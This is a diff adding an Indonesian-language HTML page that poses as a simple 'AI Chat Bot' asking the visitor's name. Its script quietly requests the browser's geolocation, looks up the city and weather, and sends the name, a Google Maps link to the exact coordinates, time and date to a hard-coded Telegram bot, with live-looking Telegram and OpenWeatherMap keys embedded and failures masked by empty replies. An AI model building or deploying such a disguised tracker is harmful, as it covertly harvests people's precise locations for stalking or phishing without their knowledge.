@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Chat Bot</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #121212;
+    color: #e0e0e0;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    overflow: hidden;
+    animation: fadeIn 1s ease-in;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+
+#chat-box {
+    width: 100%;
+    max-width: 400px;
+    background-color: #1e1e1e;
+    padding: 20px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+    border-radius: 8px;
+    margin: 0 10px;
+    animation: slideIn 0.5s ease-out;
+}
+
+@keyframes slideIn {
+    from { transform: translateY(-20px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+}
+
+.chat {
+    margin-bottom: 10px;
+    animation: fadeInUp 0.5s ease-out;
+}
+
+@keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.chat-bot {
+    color: #4fc3f7;
+}
+
+.chat-user {
+    color: #81c784;
+}
+
+#user-input {
+    width: calc(100% - 22px);
+    padding: 10px;
+    margin-top: 10px;
+    border-radius: 5px;
+    border: 1px solid #444;
+    background-color: #333;
+    color: #e0e0e0;
+    animation: fadeInUp 0.5s ease-out;
+}
+
+button {
+    width: 100%;
+    padding: 10px 0;
+    background-color: #4fc3f7;
+    color: #fff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    margin-top: 10px;
+    animation: fadeInUp 0.5s ease-out;
+}
+img {
+  position:flex;
+  margin: 1;
+}
+</style>
+</head>
+<body>
+  <center>
+<img src="https://i.ibb.co.com/8xRtQpm/images-4-removebg-preview.png"height="145px">
+<div id="chat-box">
+    <div class="chat chat-bot">Hallo, selamat datang! Nama kamu siapa?</div>
+    <div id="chat-log"></div>
+    <input type="text" id="user-input" placeholder="Ketik nama kamu..." />
+    <button onclick="sendName()">Send</button>
+</div>
+</center>
+<script>
+    const chatLog = document.getElementById("chat-log");
+    const userInput = document.getElementById("user-input");
+
+    // Fungsi untuk mengirim nama dan meminta lokasi
+    function sendName() {
+        const name = userInput.value.trim();
+        if (name) {
+            appendMessage("user", name);
+            appendMessage("bot", `Halo ${name}, apa kabar?`);
+
+            // Simpan nama dan dapatkan lokasi pengguna
+            getLocationAndSendToTelegram(name);
+        } else {
+            appendMessage("bot", "Silakan ketikkan nama kamu dulu!");
+        }
+    }
+
+    // Fungsi untuk menambahkan pesan ke chat
+    function appendMessage(sender, message) {
+        const messageDiv = document.createElement("div");
+        messageDiv.classList.add("chat", `chat-${sender}`);
+        messageDiv.textContent = message;
+        chatLog.appendChild(messageDiv);
+        chatLog.scrollTop = chatLog.scrollHeight; // Scroll ke bawah otomatis
+    }
+
+    // Fungsi untuk mengambil lokasi pengguna menggunakan Geolocation API
+    function getLocationAndSendToTelegram(name) {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    // Ambil kota dari OpenWeatherMap API berdasarkan koordinat
+                    const weatherApiKey = 'daa5f78a98d2cdd3955fee0ac2de3694';
+                    fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${weatherApiKey}&units=metric`)
+                        .then(response => response.json())
+                        .then(data => {
+                            const city = data.name;
+                            const weather = data.weather[0].description;
+                            const temperature = data.main.temp;
+
+                            // Simpan informasi di bot Telegram
+                            sendToTelegram(name, city, lat, lon, weather, temperature);
+                        })
+                        .catch(err => {
+                            appendMessage("bot", "");
+                            console.error(err);
+                        });
+                },
+                () => {
+                    appendMessage("bot", "");
+                }
+            );
+        } else {
+            appendMessage("bot", "");
+        }
+    }
+
+    // Fungsi untuk mengirimkan informasi ke bot Telegram
+    function sendToTelegram(name, city, lat, lon, weather, temperature) {
+        const telegramToken = '7207871141:AAGQHPInZWuoHSJzHr5s-kZQr4pM63fizPs';
+        const chatID = '6864784021';
+
+        // Waktu dan tanggal saat ini
+        const currentTime = new Date().toLocaleTimeString();
+        const currentDate = new Date().toLocaleDateString();
+
+        // Buat URL peta Google Maps untuk lokasi pengguna
+        const urlMaps = `https://www.google.com/maps?q=${lat},${lon}`;
+
+        // Pesan yang akan dikirim ke Telegram
+        const message = `Information found✅
+        
+🧐 Name: ${name}
+
+🚩 Location: ${urlMaps}
+
+🕐 Time: ${currentTime}
+
+🗓️ Date: ${currentDate}
+
+🏙️kecamatan: ${city}
+
+🌦️ Weather: ${weather}
+
+🌡️ Temperature: ${temperature}°C`;
+
+        // Kirim pesan ke Telegram
+        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatID,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            appendMessage("bot", `kamu lagi apa?`);
+        })
+        .catch(err => {
+            appendMessage("bot", "Hallo sayang!");
+            console.error(err);
+        });
+    }
+</script>
+
+</body>
+</html>
